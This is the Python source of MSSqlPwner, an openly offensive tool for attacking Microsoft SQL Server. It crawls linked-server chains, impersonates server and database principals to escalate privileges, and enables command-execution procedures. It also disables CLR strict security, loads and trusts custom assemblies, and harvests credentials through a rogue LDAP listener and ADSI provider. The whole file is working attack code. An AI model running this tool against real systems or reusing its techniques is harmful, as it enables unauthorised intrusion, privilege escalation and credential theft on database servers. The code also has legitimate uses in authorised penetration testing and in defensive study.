#!/usr/bin/env python
########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.1'
__email__ = ['El3ct71k@gmail.com']

########################################################
import os
import sys
import copy
import time
import json
import logging
import argparse
import utilities
from impacket import LOG
from typing import Callable
from impacket import version
from playbooks import modules
from playbooks import Queries
from typing import Literal, Union, Any
from impacket.examples import logger
from base_sql_client import BaseSQLClient
from impacket.examples.utils import parse_target


class MSSQLPwner(BaseSQLClient):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, args_options)
        if args_options.debug is True:
            logging.getLogger("impacket").setLevel(logging.DEBUG)
            # Print the Library's installation path
            logging.debug(version.getInstallationPath())
        else:
            logging.getLogger("impacket").setLevel(logging.INFO)

        self.use_state = not args_options.no_state
        self.username = user_name
        self.server_address = server_address
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{user_name}.state"
        self.state = {
            "local_hostname": str(),
            "servers_info": dict()

        }
        self.rev2self = dict()
        self.max_recursive_links = args_options.max_recursive_links
        self.execute_as = ""
        self.current_chain_id = 1
        self.chain_id = options.chain_id
        self.auto_yes = options.auto_yes

    def add_to_server_state(self, linked_server: str, key: str, value: Any, remove_duplicates: bool = True):
        """
            This function is responsible to add the server items to the server state.
        """
        if linked_server not in self.state['servers_info'].keys():
            self.state['servers_info'][linked_server] = {
                "hostname": "",
                "chain_str": linked_server,
                "chain_tree": list(),
                "db_user": "",
                "server_user": "",
                "link_name": "",
                "instance_name": "",
                "version": "",
                "domain_name": "",
                "chain_id": self.current_chain_id,
                "server_principals": list(),
                "database_principals": list(),
                "server_roles": list(),
                "database_roles": list(),
                "trustworthy_db_list": list(),
                "adsi_providers": list(),
                "server_principals_history": list(),
                "database_principals_history": list()

            }
            self.current_chain_id += 1
        if isinstance(self.state['servers_info'][linked_server][key], list):
            if not isinstance(value, list):
                value = [value]
            for v in value:
                if v in self.state['servers_info'][linked_server][key] and remove_duplicates:
                    continue
                self.state['servers_info'][linked_server][key].append(v)

        elif isinstance(self.state['servers_info'][linked_server][key], dict):
            for k, v in value.items():
                self.state['servers_info'][linked_server][key][k] = v
        else:
            self.state['servers_info'][linked_server][key] = value

    def get_title(self, linked_server):
        """
            This function is responsible to get chain or linked server title.
        """
        if self.chain_id:
            filtered_servers = utilities.filter_servers_by_chain_id(self.state['servers_info'], self.chain_id)
        else:
            filtered_servers = utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server)
        chain_str = list(filtered_servers.keys())[0]
        username = filtered_servers[chain_str]['server_user']
        db_user = filtered_servers[chain_str]['db_user']
        return f"{chain_str} (Server user: {username} | DB User: {db_user})"

    def is_valid_chain_id(self) -> bool:
        """
            This function is responsible to check if the given chain id is valid.
        """
        if self.chain_id:
            filtered_servers = utilities.filter_servers_by_chain_id(self.state['servers_info'], self.chain_id)

            if not filtered_servers:
                LOG.error(f"Chain id {self.chain_id} is not in the chain ids list")
                return False
            chain_str = list(filtered_servers.keys())[0]
            LOG.info(f"Chosen chain: {chain_str} (ID: {self.chain_id})")
        return True

    def is_valid_link_server(self, linked_server: str) -> bool:
        """
            This function is responsible to check if the given linked server is valid.
        """

        filtered_servers = utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server)

        if not filtered_servers:
            LOG.error(f"{linked_server} is not in the linked servers list")
            return False
        LOG.info(f"Chosen linked server: {linked_server}")
        return True

    def detect_architecture(self, linked_server: str, options) -> str:
        """
            This function is responsible to detect the architecture of a remote server.
        """
        if hasattr(options, "arch") and options.arch != 'autodetect':
            LOG.info(f"Architecture is set to {options.arch}")
            return options.arch

        for _, server_info in utilities.filter_servers_by_chain_str(self.state['servers_info'], linked_server).items():
            LOG.info(f"Find architecture in {server_info['chain_str']}")
            for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
                if x64_sig in server_info['version']:
                    LOG.info("Architecture is x64")
                    return "x64"
            for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
                if x86_sig in server_info['version']:
                    LOG.info("Architecture is x86")
                    return "x86"
        return ""

    def retrieve_link_server_from_chain_id(self, chain_id: int) -> dict:
        """
            This function is responsible to retrieve the link server from the given chain id.
        """
        return utilities.filter_servers_by_chain_id(self.state['servers_info'], chain_id)

    def get_chain_list(self) -> None:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Chain list:")
        for chain_str, server_info in utilities.sort_servers_by_chain_id(self.state['servers_info']).items():
            username = server_info['server_user']
            db_user = server_info['db_user']
            LOG.info(f"{server_info['chain_id']} - {chain_str} (Server user: {username} | DB User: {db_user})")

    def get_linked_server_list(self) -> None:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Linked_server_list:")
        link_servers = []
        for chain_str, server_info in utilities.sort_servers_by_chain_id(self.state['servers_info']).items():
            link_name = server_info['link_name']
            if link_name in link_servers:
                continue
            link_servers.append(link_name)
            LOG.info(f"{link_name}")

    def retrieve_server_information(self, linked_server: str = None, linked_server_name: str = None) -> bool:
        """
            This function is responsible to retrieve the server information.
        """
        if linked_server:
            server_information = self.build_chain(Queries.SERVER_INFORMATION, linked_server)
            user_information = self.build_chain(Queries.USER_INFORMATION, linked_server)
            trustworthy_db_list_results = self.build_chain(Queries.TRUSTWORTHY_DB_LIST, linked_server)
            server_roles = self.build_chain(Queries.GET_USER_SERVER_ROLES, linked_server)
            db_roles = self.build_chain(Queries.GET_USER_DATABASE_ROLES, linked_server)
            server_principals = self.build_chain(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL, linked_server)
            db_principals = self.build_chain(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL, linked_server)
        else:
            server_information = self.custom_sql_query(Queries.SERVER_INFORMATION)
            user_information = self.custom_sql_query(Queries.USER_INFORMATION)
            trustworthy_db_list_results = self.custom_sql_query(Queries.TRUSTWORTHY_DB_LIST)
            server_roles = self.custom_sql_query(Queries.GET_USER_SERVER_ROLES)
            db_roles = self.custom_sql_query(Queries.GET_USER_DATABASE_ROLES)
            server_principals = self.custom_sql_query(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL)
            db_principals = self.custom_sql_query(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL)

        if not server_information['is_success']:
            LOG.error(f"Failed to retrieve server information from {linked_server}")
            return False

        if not user_information['is_success']:
            LOG.error(f"Failed to retrieve user information from {linked_server}")
            return False

        db_user = user_information['results'][0]['db_user']
        server_user = user_information['results'][0]['server_user']

        hostname = utilities.remove_service_name(server_information['results'][0]['hostname'])

        domain_name = server_information['results'][0]['domain_name']
        server_version = server_information['results'][0]['server_version']
        instance_name = server_information['results'][0]['instance_name']

        if not linked_server:
            hostname = f"{hostname.split('.')[0]}.{self.domain}"
            self.state['local_hostname'] = hostname
            LOG.info(f"Discovered hostname: {hostname}")
            linked_server = hostname
        linked_server_name = linked_server_name if linked_server_name else hostname
        self.add_to_server_state(linked_server, "hostname", hostname)
        self.add_to_server_state(linked_server, "link_name", linked_server_name)
        self.add_to_server_state(linked_server, "db_user", db_user)
        self.add_to_server_state(linked_server, "server_user", server_user)
        self.add_to_server_state(linked_server, "version", server_version)
        self.add_to_server_state(linked_server, "domain_name", domain_name)
        self.add_to_server_state(linked_server, "instance_name", instance_name)

        if trustworthy_db_list_results['is_success']:
            for db_name in trustworthy_db_list_results['results']:
                self.add_to_server_state(linked_server, "trustworthy_db_list", db_name['name'])

        if server_roles['is_success']:
            for server_role in server_roles['results']:
                self.add_to_server_state(linked_server, "server_roles", server_role['group'])

        if db_roles['is_success']:
            for db_role in db_roles['results']:
                self.add_to_server_state(linked_server, "database_roles", db_role['group'])

        if server_principals['is_success']:
            for server_principal in server_principals['results']:
                if server_principal['permission_name'] != 'IMPERSONATE':
                    if self.state['servers_info'][linked_server]['server_user'] not in self.high_privileged_server_groups:
                        continue
                self.add_to_server_state(linked_server, "server_principals", server_principal['username'])

        if db_principals['is_success']:
            for db_principal in db_principals['results']:
                if db_principal['permission_name'] != 'IMPERSONATE':
                    if self.state['servers_info'][linked_server]['db_user'] not in self.high_privileged_database_groups:
                        continue
                self.add_to_server_state(linked_server, "database_principals", db_principal['username'])
        return True

    def retrieve_links(self, linked_server: str = None, old_state: list = None) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        if not linked_server:
            linked_server = self.state['local_hostname']
        state = copy.copy(old_state)
        state = state if state else [linked_server]
        rows = self.build_chain(Queries.GET_LINKABLE_SERVERS, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
            return

        if not rows['results']:
            LOG.info(f"No linkable servers found on {linked_server}")
            return

        for row in rows['results']:
            if not row['SRV_NAME']:
                continue

            linkable_server = utilities.remove_service_name(row['SRV_NAME'])
            if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject":
                self.add_to_server_state(linked_server, "adsi_providers", linkable_server)
                continue

            if linkable_server == state[-1].split(".")[0] or linkable_server in state[1:]:
                continue

            linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
            self.add_to_server_state(linkable_chain_str, "chain_tree", state + [linkable_server],
                                     remove_duplicates=False)
            self.add_to_server_state(linkable_chain_str, "link_name", linkable_server)
            if not self.retrieve_server_information(linkable_chain_str, linkable_server):
                del self.state['servers_info'][linkable_chain_str]
                continue

            if linkable_server == self.state['local_hostname'] or linkable_server in state \
                    or len(state) >= self.max_recursive_links:
                continue
            self.retrieve_links(linkable_chain_str, self.state['servers_info'][linkable_chain_str]['chain_tree'])

    def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(query, linked_server, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query}")
            return False

        if not results['results']:
            if self.can_impersonate(linked_server):
                if utilities.receive_answer("No results were returned. try to escalate privileges?", ['y', 'n'], 'y'):
                    return False
                else:
                    return True

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return True

    def build_query_chain(self, flow, query: str, method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]):
        """
        This function is responsible to build a query chain.
        """
        method_func = utilities.build_exec_at if method == "exec_at" else utilities.build_openquery
        chained_query = query

        # If the first server is the current server, remove it
        flow = flow[1:] if flow[0] == self.state['local_hostname'] else flow
        for link in flow[::-1]:  # Iterates over the linked servers
            chained_query = method_func(link, chained_query)
        return chained_query

    def build_linked_query_chain(self, linked_server: str, query: str,
                                 method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]) -> Union[str, None]:
        """
        This function is responsible to split a linked server path string in order to build chained queries through the
         linked servers using the OpenQuery or exec function.
        Example:
            Host -> Server1 -> Server2 -> Server3
            OpenQuery(Server1, 'OpenQuery(Server2, ''OpenQuery(Server3, '''query''')'')')
            EXEC ('EXEC (''EXEC ('''query''') AT Server3'') AT Server2') AT Server1
        """
        if not linked_server:
            return query
        if linked_server not in self.state['servers_info'].keys():
            LOG.error(f"Server {linked_server} is not linkable from {self.state['local_hostname']}")
            return None
        return self.build_query_chain(self.state['servers_info'][linked_server]['chain_tree'], query, method)

    def build_chain(self, query: str, linked_server: str,
                    method: Literal['OpenQuery', 'blind_OpenQuery', 'exec_at'] = "OpenQuery",
                    decode_results: bool = True, print_results: bool = False, wait: bool = True) -> dict:
        """
         This function is responsible to build the query chain for the given query and method.
        """
        query = f"{self.execute_as}{query}"
        if linked_server != self.state['local_hostname']:
            if method == "blind_OpenQuery":
                query = f"SELECT 1; {query}"
            query = self.build_linked_query_chain(linked_server, query, method)
            if not query:
                LOG.error("Failed to build query chain")
                return {'is_success': False, 'results': None}

        return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)

    def can_impersonate(self, linked_server: str) -> bool:
        """
        This function is responsible to check if we can impersonate as other users.
        """
        if linked_server in self.state['servers_info'].keys():
            for db_principal in self.state['servers_info'][linked_server]['database_principals']:
                if db_principal not in self.state['servers_info'][linked_server]['database_principals_history']:
                    return True
        if linked_server in self.state['servers_info'].keys():
            if self.state['servers_info'][linked_server]['server_principals']:
                for server_principal in self.state['servers_info'][linked_server]['server_principals']:
                    if server_principal not in self.state['servers_info'][linked_server]['server_principals_history']:
                        return True
        return False

    def enumerate(self) -> bool:
        """
        This function is responsible to enumerate the server.
        """
        if os.path.exists(self.state_filename):
            if self.use_state:
                if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
                                                             ["y", "n"], 'y'):
                    self.state = json.load(open(self.state_filename))
                else:
                    if not self.retrieve_server_information():
                        return False
                    self.retrieve_links()
        else:
            if not self.retrieve_server_information():
                return False
            self.retrieve_links()

        utilities.store_state(self.state_filename, self.state)
        utilities.print_state(self.state)
        return True

    def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
        """
        This function is responsible to enable a procedure on the server.
        """
        procedure_custom_name = utilities.retrieve_procedure_custom_name(procedure)
        is_procedure_enabled = self.build_chain(Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name),
                                                linked_server)

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_executable status")
            return False

        if is_procedure_enabled['results'] and is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
            LOG.warning(
                f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
            is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
            if (not is_procedure_can_be_configured['is_success']) or \
                    is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                LOG.error(f"Cant fetch sp_configure status")
                return False

            LOG.info(f"{procedure} can be configured")
            query = ""
            status = 1 if required_status else 0
            rev2self_status = 0 if required_status else 1
            query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
            LOG.info(f"Reconfiguring {procedure}")
            self.add_rev2self_cmd(linked_server,
                                  Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))

            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.warning(f"Failed to enable {procedure}")
        return True

    def execute_procedure(self, procedure: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        is_procedure_accessible = self.build_chain(
            Queries.IS_PROCEDURE_ACCESSIBLE.format(procedure=procedure),
            linked_server)

        if (not is_procedure_accessible['is_success']) or \
                is_procedure_accessible['results'][0]['is_accessible'] != 'True':
            if not self.reconfigure_procedure("show advanced options", linked_server, required_status=True):
                return False

            if not self.reconfigure_procedure(procedure, linked_server, required_status=True):
                return False

        if procedure == 'sp_oacreate':
            procedure_query = Queries.SP_OAMETHOD.format(command=command)
        else:
            procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)

        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {linked_server}")
            return False

        LOG.info(f"The {procedure} command executed successfully on {linked_server}")
        if not results['results']:
            LOG.warning("Failed to resolve the results")
            return results['is_success']

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, asm_file_location: str, linked_server: str, asm_name: str):
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False

        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        if not self.reconfigure_procedure('show advanced options', linked_server, required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure('clr enabled', linked_server, required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure('clr strict security', linked_server, required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False

        my_hash = utilities.calculate_sha512_hash(asm_file_location)
        is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash), linked_server)

        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(my_hash=my_hash), linked_server, method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.add_rev2self_cmd(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
        add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
                                          linked_server, method="exec_at")
        if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
            LOG.error(f"Failed to add custom assembly")
            return False
        return True

    def execute_custom_assembly_procedure(self, asm_file_location: str, procedure_name: str, command: str,
                                          asm_name: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, asm_name):
            return False

        add_procedure = self.build_chain(Queries.CREATE_PROCEDURE.format(asm_name=asm_name,
                                                                         procedure_name=procedure_name, arg='command'),
                                         linked_server, method="exec_at")

        if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
            LOG.error(f"Failed to create procedure")
            return False
        self.add_rev2self_cmd(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))

        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly_function(self, asm_file_location: str, function_name: str, class_name: str,
                                         namespace: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the function and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
            return False
        add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
            function_name=function_name, asm_name='FuncAsm', namespace=namespace,
            class_name=class_name, arg="@port int"),
            linked_server, method="exec_at")

        self.add_rev2self_cmd(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
        if (not add_function['is_success']) and 'already exists in database' not in add_function['replay']:
            LOG.error(f"Failed to create procedure")
            return False
        function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)

        if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
            LOG.error(f"Failed to execute custom assembly")
            return False
        LOG.info(f"Successfully executed custom assembly")
        return True

    def impersonate_as(self, linked_server: str, principal_type: Literal['server', 'database']) -> bool:
        """
        This function is responsible to impersonate as a server or database principal.
        """
        self.execute_as = ""
        if linked_server not in self.state['servers_info'].keys():
            return False

        for user in self.state['servers_info'][linked_server][f'{principal_type}_principals']:
            if user in self.state['servers_info'][linked_server][f'{principal_type}_principals_history']:
                continue

            if not self.auto_yes:
                if utilities.receive_answer(f"Try to impersonate as {user} {principal_type} "
                                            f"principal on {linked_server}?",
                                            ["y", "n"], 'n'):
                    LOG.info(f"Skipping impersonation as {user} server principal on {linked_server}")
                    continue

            LOG.info(f"Trying to impersonate as {user} {principal_type} principal on {linked_server}")
            # Log the server principal in order to avoid infinite loop

            if principal_type == 'server':
                query = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
            else:
                query = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)

            self.add_to_server_state(linked_server, f'{principal_type}_principals_history', user)
            if self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.info(f"Successfully impersonated as {user} {principal_type} principal on {linked_server}")
                self.execute_as = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
                return True
        return False

    def add_rev2self_cmd(self, linked_server: str, cmd: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """
        if linked_server not in self.rev2self.keys():
            self.rev2self[linked_server] = []
        self.rev2self[linked_server].append(f"{self.execute_as}{cmd}")

    def rev2self_cmd(self) -> None:
        """
        This function is responsible to revert the database to the previous state.
        """
        self.execute_as = ""
        if not self.rev2self:
            return
        LOG.info("Reverting to self..")
        for linked_server, command in self.rev2self.items():
            if not command:
                continue
            if self.build_chain("".join(command), linked_server, "exec_at")['is_success']:
                LOG.info(f"Successfully reverted to self on {linked_server}")
            self.rev2self[linked_server].clear()

    def procedure_runner(self, func: Callable, args: list, **kwargs) -> bool:
        """
        This function is responsible to attempt to run a procedure through local or link server.
        This function will try  to run the procedure through the following methods if no success:
        1. Execute the procedure locally.
        2. Impersonate as a server principal and execute the procedure.
        3. Impersonate as a database principal and execute the procedure.

        """
        self.execute_as = ""
        linked_server = kwargs['linked_server']
        if self.can_impersonate(linked_server):
            if self.auto_yes or utilities.receive_answer(f"The {linked_server} server can escalate privileges, "
                                                         f"do you want to continue with the current privileges?",
                                                         ['y', 'n'], 'y'):
                if func(*args, **kwargs):
                    return True
        else:
            if func(*args, **kwargs):
                return True

        while self.impersonate_as(linked_server, principal_type='server'):
            if func(*args, **kwargs):
                return True

        while self.impersonate_as(linked_server, principal_type='database'):
            if func(*args, **kwargs):
                return True

        return False

    def procedure_chain_builder(self, func: Callable, args: list, **kwargs) -> bool:
        """
        This function is responsible to build a procedure chain.
        """
        if 'linked_server' not in kwargs.keys():
            LOG.error("No linked server was provided")
            return False

        if kwargs['linked_server'] == self.state['local_hostname']:
            retval = self.procedure_runner(func, args, **kwargs)
            if retval:
                LOG.info(f"Successfully executed {func.__name__} on {kwargs['linked_server']}")
                return True

            LOG.error(f"{func.__name__} cannot be executed on {kwargs['linked_server']}")
            LOG.info("Trying to find a linkable server chain")

        if self.chain_id:
            filtered_server = utilities.filter_servers_by_chain_id(self.state['servers_info'], self.chain_id)
        else:
            filtered_server = utilities.filter_servers_by_link_name(self.state['servers_info'], kwargs['linked_server'])

        for chain_str, _ in filtered_server.items():
            LOG.info(f"Trying to execute {func.__name__} on {chain_str}")
            kwargs['linked_server'] = chain_str
            if self.procedure_runner(func, args, **kwargs):
                LOG.info(f"Successfully executed {func.__name__} on {chain_str}")
                return True

        LOG.warning(f"Failed to execute {func.__name__} on {kwargs['linked_server']}")
        return False

    def retrieve_password(self, linked_server: str, port: int, adsi_provider: str):
        is_discovered = False
        arch = self.detect_architecture(linked_server, options)
        if not arch:
            LOG.error(f"Failed to detect the architecture of {linked_server}")
            return
        ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
        ldap_file_location = os.path.join("playbooks/custom-asm", ldap_filename)

        for _, server_info in utilities.filter_servers_by_chain_str(self.state['servers_info'], linked_server).items():
            if not server_info['adsi_providers']:
                continue
            if adsi_provider and adsi_provider not in server_info['adsi_providers']:
                LOG.error(f"The {linked_server} server does not support the {adsi_provider} provider")
                return
            adsi_provider = adsi_provider if adsi_provider else server_info['adsi_providers'][0]
            is_discovered = True
            if self.procedure_chain_builder(self.execute_custom_assembly_function,
                                            [ldap_file_location, "listen", "LdapSrv", "ldapAssembly",
                                             str(port)],
                                            linked_server=linked_server):
                time.sleep(1)
                client = MSSQLPwner(self.server_address, self.username, self.options)
                client.options.debug = False
                LOG.setLevel(logging.ERROR)
                client.connect(username, password, domain)
                client.state = self.state
                LOG.setLevel(logging.INFO)
                client.options.debug = self.options.debug
                chained_query = self.build_query_chain(server_info['chain_tree'] + [adsi_provider],
                                                       Queries.LDAP_QUERY.format(port=port), "OpenQuery")

                client.custom_sql_query(chained_query, wait=True)
                LOG.info("Sleeping for 5 seconds..")
                time.sleep(5)
                client.disconnect()
                tds_data = self.ms_sql.recvTDS()
                self.ms_sql.replies = self.ms_sql.parseReply(tds_data['Data'], False)

                results = self.parse_logs()
                if results and results['is_success']:
                    LOG.info(f"Successfully retrieved password from {server_info['chain_str']}")
                    for credentials in results['results'][0].values():
                        LOG.info(f"[+] Discovered credentials: {credentials}")
                    break

        if not is_discovered:
            if adsi_provider:
                LOG.error(f"Failed to access {adsi_provider} ADSI provider on {linked_server}")
            else:
                LOG.error(f"There is no ADSI providers on {linked_server}")


if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    parser, available_modules = utilities.generate_arg_parser()
    available_modules.remove("interactive")
    available_modules += ["help", "exit"]
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if not options.target:
        LOG.error("target must be supplied!")
        exit()

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None \
            and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    mssql_client = MSSQLPwner(address, username, options)
    if not mssql_client.connect(username, password, domain):
        sys.exit(1)
    if not mssql_client.enumerate():
        sys.exit(1)

    if options.module == "interactive":
        chosen_chain_id = options.chain_id
        chosen_link_server = options.link_server

        while True:
            try:
                chosen_link_server = chosen_link_server if chosen_link_server else mssql_client.state['local_hostname']
                title = mssql_client.get_title(chosen_link_server)

                args_list = input(f"MSSqlPwner#{title}> ").strip()
                if args_list.split(" ")[0] not in available_modules:
                    LOG.error(f"Unknown module {args_list.split(' ')[0]}, you can use: {', '.join(available_modules)}")
                    continue
                elif args_list == "exit":
                    break
                elif args_list == "help":
                    parser.print_help()
                    continue
                arguments = utilities.split_exclude_quotes(f'{" ".join(sys.argv[1:-1]).strip()} {args_list}')
                args = parser.parse_args(arguments)
                args.chain_id = chosen_chain_id
                args.link_server = chosen_link_server
                if args.module == "enumerate":
                    mssql_client.enumerate()
                    continue
                elif args.module == "set-chain":
                    chosen_link_server = None
                    mssql_client.chain_id = args.chain
                    if not mssql_client.is_valid_chain_id():
                        LOG.error("Chain id is not valid!")
                        mssql_client.chain_id = None
                        continue
                    chosen_chain_id = args.chain
                    continue
                elif args.module == "set-link-server":
                    chosen_chain_id = None
                    mssql_client.chain_id = None
                    if not mssql_client.is_valid_link_server(args.link):
                        LOG.error("Linked server is not valid!")
                        continue
                    chosen_link_server = args.link
                    continue

                if not modules.execute_module(args, mssql_client):
                    continue

            except KeyboardInterrupt:
                break
    else:
        modules.execute_module(options, mssql_client)

    mssql_client.rev2self_cmd()
    mssql_client.disconnect()
